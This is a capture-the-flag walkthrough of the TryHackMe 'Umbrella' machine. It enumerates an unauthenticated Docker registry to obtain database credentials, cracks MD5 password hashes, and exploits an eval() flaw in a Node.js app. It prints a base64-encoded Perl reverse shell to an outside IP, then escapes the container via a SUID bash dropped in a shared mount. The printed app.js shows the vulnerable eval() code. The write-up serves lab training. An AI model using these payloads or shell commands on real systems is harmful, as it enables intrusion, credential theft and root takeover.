# Umbrella

---

Platform: Tryhackme

Difficulty: Medium

Initial Access: Docker Registry Enumeration & Credential Disclosure

Privilege Escalation: Docker container escape via mounted volume (SUID binary drop)

---

Nmap scan Results:

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=2000 10.10.251.82 -oN nmap.full
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 09:02 EDT
Nmap scan report for 10.10.251.82
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 75:a0:5a:1c:29:5b:a1:2c:c8:a6:d7:d5:b9:be:28:0a (RSA)
|   256 65:05:47:5c:be:19:36:b3:85:a3:f8:0e:de:e4:f7:c8 (ECDSA)
|_  256 4b:8d:6e:a1:87:ac:d9:1f:50:aa:9a:98:ef:8e:3a:6b (ED25519)
3306/tcp open  mysql   MySQL 5.7.40
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40
|   Thread ID: 3
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ODBCClient, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, IgnoreSigpipes, SupportsCompression, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, LongColumnFlag, InteractiveClient, FoundRows, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Iy\x02\x05R4qD\x18Y0\x07\x02\x05\x17lY\x18r(
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-12-22T10:04:49
|_Not valid after:  2032-12-19T10:04:49
|_ssl-date: TLS randomness does not represent time
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
8080/tcp open  http    Node.js (Express middleware)
|_http-title: Login
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### **Open Ports & Services Available**

| Port | Methodology |
| --- | --- |
| **22** | Openssh, offcourse for later use. |
| **3306** | Mysql service, looks interesting, but currently we do not have any credentials for logging in to that. Let’s see if we get credentials from somewhere else. |
| **5000** | Docker registry API v2 is open. Maybe we can pull docker images anonymously if authentication is disabled. |
| **8080** | Node.js Express App (Login Page), again interesting but only if we have any credentials for logging in. |

---

### Port 8080 (Node.js app)

Just a login page, not any interesting things in source code and directory busting also don’t give any juicy results here.

Can try for sql injection payload also, but that also didn’t worked.

![image.png](image.png)

Looks like the only way to get inside is valid credentials. But now, it’s a dead end.

---

### Port 5000 (Docker Registry enumeration)

The target exposed a Docker Registry on port 5000. A Docker Registry is a service for storing and sharing Docker images. Since it was misconfigured and allowed unauthenticated access, I was able to enumerate available images, pull them locally, and inspect their contents for sensitive information such as credentials or internal code.

We can use the [article by Hacktricks on docker registry](https://book.hacktricks.wiki/en/network-services-pentesting/5000-pentesting-docker-registry.html) to enumerate this:

[5000 - Pentesting Docker Registry - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/5000-pentesting-docker-registry.html)

We try listing repositories available:

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ curl http://10.10.251.82:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
```

Here, we see `umbrella/timetracking` repository is available to us.

Next, if we try to get the tags of this repository, we see a tag called latest.

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ curl http://10.10.251.82:5000/v2/umbrella/timetracking/tags/list
{"name":"umbrella/timetracking","tags":["latest"]}
```

Then, I used the `/v2/umbrella/timetracking/manifests/latest` endpoint to retrieve the manifest of the image.

<aside>
💡

A **Docker manifest** is a **JSON document** that describes:

- The layers (filesystems) of the Docker image
- Its architecture (amd64, arm, etc.)
- Its configuration (entrypoint, env vars)
- Its digest (like a hash ID)

Think of it as a **blueprint or metadata** about the image — it doesn’t contain the actual data, but tells Docker **how to build or pull** the image correctly.

</aside>

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ curl http://10.10.251.82:5000/v2/umbrella/timetracking/manifests/latest
```

![image.png](image%201.png)

And here, if we analyse the result carefully, we see database credentials stored in plain text. Maybe we can use them to connect to mysql service running on port 3306.

![image.png](image%202.png)

The results provided SHA256 digests of each image layer, which I downloaded via the `/blobs/` endpoint.

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ curl http://10.10.251.82:5000/v2/umbrella/timetracking/blobs/sha256:c9124d8ccff258cf42f1598eae732c3f530bf4cdfbd7c4cd7b235dfae2e0a549 --output blob1.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1428  100  1428    0     0   3707      0 --:--:-- --:--:-- --:--:--  3709

┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ ls
blob1.tar  nmap.full  pass.txt  ps.txt  user.txt
```

Extracting the layers revealed a file named app.js maybe the backend code for the application running on port 8080.

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ tar -xf blob1.tar                                                                                                                                  
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ ls
blob1.tar  nmap.full  pass.txt  ps.txt  user.txt  usr                                                                                                                  
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ cd usr                                                                                                                       
┌──(ghost㉿kali)-[~/tryhackme/umbrella/usr]
└─$ ls -la
total 12
drwxr-xr-x 3 ghost kali 4096 Dec 18  2022 .
drwxr-xr-x 3 ghost kali 4096 Jul 17 09:50 ..
drwxr-xr-x 3 ghost kali 4096 Dec 22  2022 src                                                                                                                              
┌──(ghost㉿kali)-[~/tryhackme/umbrella/usr]
└─$ cd src     
   
┌──(ghost㉿kali)-[~/tryhackme/umbrella/usr/src]
└─$ ls    
app                                                                                                                               
┌──(ghost㉿kali)-[~/tryhackme/umbrella/usr/src]
└─$ cd app   
       
┌──(ghost㉿kali)-[~/…/umbrella/usr/src/app]
└─$ ls -la
total 12
drwxr-xr-x 2 ghost kali 4096 Dec 22  2022 .
drwxr-xr-x 3 ghost kali 4096 Dec 22  2022 ..
-rw-r--r-- 1 ghost kali 3237 Dec 22  2022 app.js
```

Have a look at the contents of app.js file.

```bash
┌──(ghost㉿kali)-[~/…/umbrella/usr/src/app]
└─$ cat app.js    
const mysql = require('mysql');
const express = require('express');
const session = require('express-session');
const path = require('path');
const crypto = require('crypto')
const cookieParser = require('cookie-parser');
const fs = require('fs');

const connection = mysql.createConnection({
        host     : process.env.DB_HOST,
        user     : process.env.DB_USER,
        password : process.env.DB_PASS,
        database : process.env.DB_DATABASE
});

const app = express();
app.set('view engine' , 'ejs')
app.set('views', './views')
app.use(express.static(__dirname + '/public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(cookieParser());
app.use(session({secret: "Your secret key", cookie : {secure : false}}));

var logfile = fs.createWriteStream(process.env.LOG_FILE, {flags: 'a'});

var log = (message, level) => {
        format_message = `[${level.toUpperCase()}] ${message}`;
        logfile.write(format_message + "\n")
        if (level == "warn") console.warn(message)
        else if (level == "error") console.error(message)
        else if (level == "info") console.info(message)
        else console.log(message)
}

// http://localhost:8080/
app.get('/', function(request, response) {

        if (request.session.username) {

                connection.query('SELECT user,time FROM users', function(error, results) {
                        var users = []
                        if (error) {
                                log(error, "error")
                        };

                        for (let row in results){

                                let min = results[row].time % 60;
                                let padded_min = `${min}`.length == 1 ? `0${min}` : `${min}`
                                let time = `${(results[row].time - min) / 60}:${padded_min} h`;
                                users.push({name : results[row].user, time : time});
                        }
                        response.render('home', {users : users});
                });

        } else{
                response.render('login');
        }

});

// http://localhost:8080/time
app.post('/time', function(request, response) {

    if (request.session.loggedin && request.session.username) {

        let timeCalc = parseInt(eval(request.body.time));
                let time = isNaN(timeCalc) ? 0 : timeCalc;
        let username = request.session.username;

                connection.query("UPDATE users SET time = time + ? WHERE user = ?", [time, username], function(error, results, fields) {
                        if (error) {
                                log(error, "error")
                        };

                        log(`${username} added ${time} minutes.`, "info")
                        response.redirect('/');
                });
        } else {
        response.redirect('/');;
    }

});

// http://localhost:8080/auth
app.post('/auth', function(request, response) {

        let username = request.body.username;
        let password = request.body.password;

        if (username && password) {

                let hash = crypto.createHash('md5').update(password).digest("hex");

                connection.query('SELECT * FROM users WHERE user = ? AND pass = ?', [username, hash], function(error, results, fields) {

                        if (error) {
                                log(error, "error")
                        };

                        if (results.length > 0) {

                                request.session.loggedin = true;
                                request.session.username = username;
                                log(`User ${username} logged in`, "info");
                                response.redirect('/');
                        } else {
                                log(`User ${username} tried to log in with pass ${password}`, "warn")
                                response.redirect('/');
                        } 
                });
        } else {
                response.redirect('/');
        } 

});

app.listen(8080, () => {
        console.log("App listening on port 8080")
});
```

Confirmed! this is the backend code for application running on port 8080, but for now we can keep it aside and let’s see if we can get any valid login credentials from the database to login to this application on port 8080.

---

### Port 3306 (MySQL enumeration)

We already got valid credentials for database.
I connected to the database and enumerated a table named `users`, which contained four usernames with their associated MD5 password hashes.

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ mysql -h 10.10.251.82 -u root -p --ssl-verify-server-cert=False
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
.....
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| timetracking       |
+--------------------+
5 rows in set (0.181 sec)

MySQL [(none)]> use timetracking;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [timetracking]> show tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.372 sec)

MySQL [timetracking]> SELECT * from users;
+----------+----------------------------------+-------+
| user     | pass                             | time  |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+
```

I extracted the hashes and used **John the Ripper** with the rockyou wordlist to crack them:

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (chris-r)     
sunshine1        (jill-v)     
Password1        (claire-r)     
sandwich         (barry-b)     
4g 0:00:00:00 DONE (2025-07-17 09:29) 400.0g/s 864000p/s 864000c/s 1363KC/s allstars..brigitte
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

We can try one by one which pair of cred will work on Node.js application(port 8080) or maybe on SSH(port 22).

The valid credential are: `claire-r: Password1` This worked on both node.js application and also on ssh.

---

### Initial Access via node.js app running on docker container

I logged in via the creds we get.

And it looks like a timetracking application, we can put integers in that input and can also use mathematical expressions.

If we look back into our app.js file extracted from docker image layers, the `/time` route used `eval()` unsafely on user input:

![image.png](image%203.png)

This allows authenticated users to achieve **Remote Code Execution (RCE)** by submitting crafted input such as:

With `arguments[1].end(require('child_process').execSync('cat /etc/passwd'))`  we are able to retrieve the `/etc/passwd` file. 

![image.png](image%204.png)

And with following payload we can get the reverse shell back to our machine:

```bash
# Perl reverse shell
perl -e 'use Socket;$i="10.17.87.131";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
# With base64 encoding our payload looks something like this
require('child_process').execSync('echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTcuODcuMTMxIjskcD00NDQ1O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=| base64 -d | bash')
```

[https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet](https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet)

Now, just have to setup netcat on listning mode and have to put this payload in input and submit.

![image.png](image%205.png)

![image.png](image%206.png)

We got directly root shell on docker container.

---

### Initial Access via SSH on host target machine

Login on ssh with the same credentials we got earlier`claire-r:Password1` 

```bash
┌──(ghost㉿kali)-[~/tryhackme/umbrella]
└─$ ssh claire-r@10.10.251.82
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.251.82' (ED25519) to the list of known hosts.
claire-r@10.10.251.82's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
...
claire-r@ip-10-10-251-82:~$ id
uid=1001(claire-r) gid=1001(claire-r) groups=1001(claire-r)
claire-r@ip-10-10-251-82:~$ ls -la
total 36
drwxr-xr-x 4 claire-r claire-r 4096 Jul 17 13:35 .
drwxr-xr-x 5 root     root     4096 Jul 17 12:59 ..
-rw------- 1 claire-r claire-r   61 Sep 22  2023 .bash_history
-rw-r--r-- 1 claire-r claire-r  220 Dec 22  2022 .bash_logout
-rw-r--r-- 1 claire-r claire-r 3771 Dec 22  2022 .bashrc
drwx------ 2 claire-r claire-r 4096 Jul 17 13:35 .cache
-rw-r--r-- 1 claire-r claire-r  807 Dec 22  2022 .profile
drwxrwxr-x 6 claire-r claire-r 4096 Dec 22  2022 timeTracker-src
-rw-r--r-- 1 claire-r claire-r   38 Dec 22  2022 user.txt
claire-r@ip-10-10-251-82:~$ cat user.txt
THM{d832c0e4......REDACTED}
```

---

### Privilege Escalation

During post-exploitation, I found that the container(root access) had a volume mount to a directory named `/logs`, which was also accessible on the host system(claire-r account’s access).

![image.png](image%207.png)

![image.png](image%208.png)

![image.png](image%209.png)

Strategy:
Use your **root access inside the container** to **place a SUID-root binary** (like a bash shell) inside the **mounted folder**. Since that folder is also visible to the host and owned by root (because the file was created as root inside the container), you can run it from the host to escalate privileges.

I created a SUID-enabled bash binary inside the mounted folder of host target machine:

```bash
claire-r@ip-10-10-251-82:~/timeTracker-src/logs$ cp /bin/bash .
```

On container give it permission of root:

```bash
# ls -la
total 1168
drwxrw-rw- 2 1001 1001    4096 Jul 17 13:58 .
drwxr-xr-x 1 root root    4096 Dec 22  2022 ..
-rwxr-xr-x 1 1001 1001 1183448 Jul 17 13:58 bash
-rw-r--r-- 1 root root     434 Jul 17 13:56 tt.log
# chown root:root bash
# chmod 4777 bash
```

On the host, I executed the binary:

![image.png](image%2010.png)

And we are now root on the host!

Last task: Grab the root flag

```bash
bash-5.0# cd /root
bash-5.0# ls -la
total 44
drwx------  6 root root 4096 May  7 19:54 .
drwxr-xr-x 19 root root 4096 Jul 17 12:59 ..
lrwxrwxrwx  1 root root    9 Sep 22  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 May  7 19:54 .cache
drwx------  3 root root 4096 Dec 22  2022 .gnupg
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   38 Dec 22  2022 root.txt
drwx------  4 root root 4096 Dec 20  2022 snap
drwx------  2 root root 4096 Dec 20  2022 .ssh
-rw-------  1 root root 1106 Dec 22  2022 .viminfo
-rw-r--r--  1 root root  165 Dec 22  2022 .wget-hsts
bash-5.0# cat root.txt
THM{1e15fbe7978.....REDACTED}
```

---

That’s it for this machine.✅